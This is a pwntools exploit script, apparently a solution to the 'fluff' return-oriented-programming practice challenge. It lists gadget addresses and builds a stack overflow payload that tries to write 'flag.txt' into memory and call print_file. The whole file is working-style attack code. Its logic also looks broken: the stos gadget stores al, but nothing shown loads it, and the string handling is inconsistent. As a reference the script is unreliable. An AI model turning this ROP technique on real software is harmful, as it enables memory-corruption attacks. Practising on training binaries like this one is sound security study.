#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  '.'

"""
0x0000000000400639: stos BYTE PTR es:[rdi],al
0x000000000040063a:	ret    
0x00000000004006a3: pop rdi; ret; 
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; 
0x00000000004004d2: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x200b1d; test rax, rax; je 0x4e2; call rax; 
0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
"""

io = start()

print_file = p64(0x0000000000400510)
stos = p64(0x0000000000400639)
ret = p64(0x000000000040063a)
pop_rdi = p64(0x00000000004006a3)
pop_rdx = p64(0x000000000040062a)

dss = 0x0000000000601028 + 0x20
#dss = 0x0000000000601038 + 0x20  #bss

def mov_flag(string, section):

	s = ""
	s += pop_rdi
	s += p64(section)
	s += pop_rdx
	s += string 
	s += "junkjunk" # dummy for rcx
	s += stos

	return s

buf = ""
buf += "\x90"*40
buf += mov_flag("f"*8, dss)
buf += mov_flag("l"*8, dss+1)
buf += mov_flag("a"*8, dss+2)
buf += mov_flag("g"*8, dss+3)
buf += mov_flag("."*8, dss+4)
buf += mov_flag("t"*8, dss+5)
buf += mov_flag("x"*8, dss+6)
buf += mov_flag("t"*8, dss+7)

# calling print_file

buf += pop_rdi
buf += p64(dss)
buf += ret
buf += print_file


write("in.txt", buf)

io.sendline(buf)
io.interactive()

